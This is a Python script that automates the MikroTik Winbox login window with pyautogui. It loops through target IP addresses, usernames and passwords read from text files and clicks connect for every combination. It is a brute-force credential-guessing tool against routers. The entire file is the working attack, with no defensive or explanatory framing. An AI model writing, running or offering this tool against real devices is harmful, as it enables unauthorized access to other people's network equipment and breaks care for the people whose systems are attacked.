import pyautogui, time
from pywinauto.application import Application
app = Application(backend="uia").start("winbox64.exe")
time.sleep(1)
addressx, addressy = pyautogui.locateCenterOnScreen('ad.png')
loginuserx, loginusery = pyautogui.locateCenterOnScreen('login.png')
passwordx, passwordy = pyautogui.locateCenterOnScreen('pas.png')
conlocatbt = pyautogui.locateCenterOnScreen('conb.png')

ipfile = open('ip.txt', 'r')
try:
    countipline = 0
    #type ip target
    for newip in ipfile: 
        print("newip is: ", newip)
        countipline +=1
        pyautogui.click(addressx + 70, addressy)
        pyautogui.tripleClick()
        pyautogui.press('delete')
        pyautogui.write(newip.strip(), interval=0.10)
        userfile = open('user.txt', 'r')
        countuserline = 0
        try:
            for newuser in userfile:
                print("newuser is: ", newuser)
                countuserline +=1
                #type username
                pyautogui.click(loginuserx + 70, loginusery)
                pyautogui.tripleClick()
                pyautogui.press('delete')
                print(newuser)
                pyautogui.write(newuser, interval=0.10)
                passfile = open('pass.txt', 'r')
                countpassline = 0
                try:
                    for newpass in passfile:
                        print("newpass is: ", newpass)
                        countpassline +=1
                        #type password
                        pyautogui.click(passwordx + 70, passwordy)
                        pyautogui.tripleClick()
                        pyautogui.press('delete')
                        print(newpass)
                        pyautogui.write(newpass, interval=0.10)                        
                        #click on connect button
                        pyautogui.click(conlocatbt)
                        time.sleep(3)
                except Exception as errorpass: 
                    print ("\n Error in password loop file line:" , countpassline, " \n ")
                    print(errorpass)
                passfile.close()
        except Exception as erroruser:
            print ("\n Error in user loop file line:" , countuserline, " \n ")
            print(erroruser)
        userfile.close()
except Exception as errorip:
        print ("\n Error in user loop file line:" , countipline, " \n ")
        print(errorip)
ipfile.close()